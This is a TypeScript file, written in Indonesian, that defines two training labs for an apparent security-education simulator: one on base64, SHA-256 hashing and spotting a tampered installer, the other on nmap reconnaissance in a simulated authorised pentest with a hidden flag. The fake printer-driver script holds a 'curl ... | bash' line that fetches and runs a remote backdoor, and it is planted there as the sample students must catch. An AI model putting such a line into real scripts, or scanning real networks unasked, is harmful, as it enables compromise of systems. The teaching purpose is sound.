import type { LabDefinition } from "@/engine";
import { base64Encode, sha256 } from "@/engine/crypto/hash";
import { BASIC_COMMANDS, fileAt, has, NET_COMMANDS } from "./helpers";

const APP = "#!/bin/bash\necho 'Memasang Aplikasi Kasir v2.1...'\n";
const DRIVER_ASLI = "#!/bin/bash\necho 'Memasang driver printer...'\n";
const DRIVER_PALSU = "#!/bin/bash\necho 'Memasang driver printer...'\ncurl -s http://203.0.113.66/pintu-belakang | bash\n";

export const kriptoDasarLab: LabDefinition = {
  id: "kripto-dasar",
  title: "Encoding, Hash & Integritas File",
  summary: "Bedakan encoding dari enkripsi, lihat efek longsor (avalanche) hash, lalu temukan file unduhan yang sudah dimodifikasi.",
  difficulty: "pemula",
  estimatedMinutes: 15,
  xp: 110,
  controllable: ["pc"],
  allowedCommands: [...BASIC_COMMANDS, "base64", "md5sum", "sha256sum"],
  briefing: [
    "Seorang rekan mengirim pesan \"rahasia\" yang katanya sudah \"dienkripsi\". Selain itu, kamu baru mengunduh dua file installer dari mirror tidak resmi.",
    "Tugasmu: buktikan bahwa pesan itu hanya di-*encode*, lalu gunakan **hash SHA-256** untuk memeriksa apakah installer yang diunduh masih asli.",
  ],
  topology: {
    devices: [
      {
        id: "pc",
        name: "PC Kamu",
        hostname: "netsec",
        kind: "pc",
        position: { x: 0, y: 0 },
        interfaces: [{ name: "eth0", ip: "192.168.1.10/24" }],
        files: {
          "pesan.txt": `${base64Encode("Password Wi-Fi kantor: Kopi-Pagi-2026. Jangan disebar!")}\n`,
          "unduhan/aplikasi-kasir.sh": APP,
          "unduhan/driver-printer.sh": DRIVER_PALSU,
          "unduhan/SHA256SUMS": `${sha256(APP)}  aplikasi-kasir.sh\n${sha256(DRIVER_ASLI)}  driver-printer.sh\n`,
        },
      },
    ],
    links: [],
  },
  objectives: [
    { id: "decode", text: "Baca `pesan.txt`, lalu ubah kembali ke teks asli dengan `base64 -d pesan.txt`", check: has("base64:decoded") },
    { id: "hash", text: "Hitung hash SHA-256 sebuah teks: `echo -n halo | sha256sum`", check: has("sha256sum:stdin") },
    {
      id: "avalanche",
      text: "Ubah satu huruf saja (`echo -n Halo | sha256sum`) dan bandingkan — hasilnya berubah total!",
      check: (ctx) => [...ctx.facts].filter((f) => f.startsWith("sha256sum:stdin:")).length >= 2,
    },
    {
      id: "files",
      text: "Hitung hash kedua installer dengan `sha256sum` (bisa sekaligus: `sha256sum file1 file2`)",
      check: (ctx) => ctx.facts.has("sha256sum:/home/siswa/unduhan/aplikasi-kasir.sh") && ctx.facts.has("sha256sum:/home/siswa/unduhan/driver-printer.sh"),
    },
    { id: "compare", text: "Bandingkan dengan hash resmi di `unduhan/SHA256SUMS`", check: has("cat:/home/siswa/unduhan/SHA256SUMS") },
    {
      id: "report",
      text: "Tulis nama file yang **sudah dimodifikasi** ke `~/laporan.txt`, lalu lihat isinya untuk tahu apa yang disisipkan",
      check: (ctx) => {
        const f = fileAt(ctx, "pc", "/home/siswa/laporan.txt");
        return f?.type === "file" && f.content.includes("driver") && !f.content.includes("kasir");
      },
    },
  ],
  hints: [
    "Base64 bisa dibalik oleh siapa saja tanpa kunci. Itu sebabnya disebut *encoding*, bukan *enkripsi*.",
    "`echo -n` mencegah echo menambahkan baris baru — tanpa `-n`, hash yang dihitung adalah \"halo\" + newline.",
    "Contoh: `sha256sum unduhan/aplikasi-kasir.sh unduhan/driver-printer.sh`. Hash yang tidak sama dengan SHA256SUMS berarti isi file sudah berubah.",
  ],
};

export const reconLab: LabDefinition = {
  id: "nmap-recon",
  title: "Reconnaissance dengan nmap",
  summary: "Petakan jaringan klien dalam sebuah pentest resmi: temukan host, port terbuka, versi layanan, dan layanan tersembunyi.",
  difficulty: "menengah",
  estimatedMinutes: 20,
  xp: 150,
  controllable: ["kali"],
  allowedCommands: [...NET_COMMANDS, "nmap", "curl", "nc"],
  briefing: [
    "PT Contoh Jaya menyewa timmu untuk **penetration test** dan sudah menandatangani surat izin untuk jaringan **10.10.10.0/24**. Kamu duduk di laptop Kali Linux yang tersambung ke jaringan itu.",
    "Tahap pertama setiap pentest adalah *reconnaissance*: mengetahui apa saja yang ada di jaringan sebelum mencoba apa pun. Ingat: tanpa izin tertulis, scanning seperti ini **ilegal**.",
  ],
  topology: {
    devices: [
      { id: "kali", name: "Laptop Pentester", hostname: "kali", kind: "attacker", position: { x: 0, y: 170 }, interfaces: [{ name: "eth0", ip: "10.10.10.99/24" }] },
      { id: "sw", name: "Switch", kind: "switch", position: { x: 230, y: 170 } },
      {
        id: "web",
        name: "Web Server",
        hostname: "web",
        kind: "server",
        position: { x: 480, y: 0 },
        interfaces: [{ name: "eth0", ip: "10.10.10.10/24" }],
        os: "Linux 5.15 (Ubuntu 22.04)",
        services: [{ port: 22, protocol: "tcp", name: "ssh", version: "OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)" }],
        web: { https: true, software: "Apache/2.4.52 (Ubuntu)", routes: { "/": { body: "<h1>PT Contoh Jaya</h1>\n" } } },
      },
      {
        id: "file",
        name: "File Server",
        hostname: "files",
        kind: "server",
        position: { x: 480, y: 120 },
        interfaces: [{ name: "eth0", ip: "10.10.10.20/24" }],
        os: "Linux 4.15 (Ubuntu 18.04)",
        services: [
          { port: 21, protocol: "tcp", name: "ftp", version: "vsftpd 3.0.3", banner: "220 (vsFTPd 3.0.3)" },
          { port: 22, protocol: "tcp", name: "ssh", version: "OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)" },
          { port: 445, protocol: "tcp", name: "microsoft-ds", version: "Samba smbd 4.7.6-Ubuntu" },
        ],
      },
      {
        id: "printer",
        name: "Printer",
        hostname: "printer",
        kind: "server",
        position: { x: 480, y: 240 },
        interfaces: [{ name: "eth0", ip: "10.10.10.30/24" }],
        os: "HP embedded (JetDirect)",
        services: [{ port: 9100, protocol: "tcp", name: "jetdirect", version: "HP JetDirect" }],
        web: { software: "HP HTTP Server/2.0", routes: { "/": { body: "<h1>HP LaserJet - Status: Siap</h1>\n" } } },
      },
      {
        id: "dev",
        name: "Server Developer",
        hostname: "dev",
        kind: "server",
        position: { x: 480, y: 360 },
        interfaces: [{ name: "eth0", ip: "10.10.10.40/24" }],
        os: "Linux 6.8 (Ubuntu 24.04)",
        services: [{ port: 22, protocol: "tcp", name: "ssh", version: "OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)" }],
        web: {
          port: 31337,
          software: "Werkzeug/3.0.1 Python/3.12.3",
          routes: { "/": { body: "Panel debug developer (JANGAN dibuka ke publik!)\nFLAG{port-tinggi-bukan-berarti-tersembunyi}\n" } },
        },
      },
    ],
    links: [
      ["kali:eth0", "sw:p1"],
      ["web:eth0", "sw:p2"],
      ["file:eth0", "sw:p3"],
      ["printer:eth0", "sw:p4"],
      ["dev:eth0", "sw:p5"],
    ],
  },
  objectives: [
    {
      id: "discover",
      text: "Cari semua host yang hidup: `sudo nmap -sn 10.10.10.0/24`",
      check: (ctx) => ctx.facts.has("nmap:sn") && ["10", "20", "30", "40"].every((h) => ctx.facts.has(`nmap:host-up:10.10.10.${h}`)),
    },
    { id: "web", text: "Scan port web server: `sudo nmap 10.10.10.10`", check: has("nmap:scanned:10.10.10.10") },
    { id: "version", text: "Cari tahu versi layanan di file server: `sudo nmap -sV 10.10.10.20` (versi lama = potensi celah!)", check: has("nmap:version:10.10.10.20:22") },
    { id: "printer", text: "Identifikasi perangkat di 10.10.10.30 dengan deteksi OS: `sudo nmap -O 10.10.10.30`", check: has("nmap:os:10.10.10.30") },
    { id: "default", text: "Scan server developer (10.10.10.40) dengan scan default. Hanya ada SSH?", check: has("nmap:scanned:10.10.10.40") },
    { id: "allports", text: "Scan **semua** port: `sudo nmap -p- 10.10.10.40`", check: has("nmap:open:10.10.10.40:31337") },
    { id: "flag", text: "Buka layanan tersembunyi itu dengan `curl` dan temukan FLAG", check: has("curl:ok:10.10.10.40/") },
  ],
  hints: [
    "Pada jaringan lokal, `nmap -sn` dengan sudo memakai ARP — perhatikan banjir paket ARP kuning di peta!",
    "Scan default nmap hanya memeriksa ~1000 port paling umum. Layanan di port tidak biasa (seperti 31337) akan terlewat.",
    "Untuk membuka web di port lain: `curl http://10.10.10.40:31337/`",
  ],
};
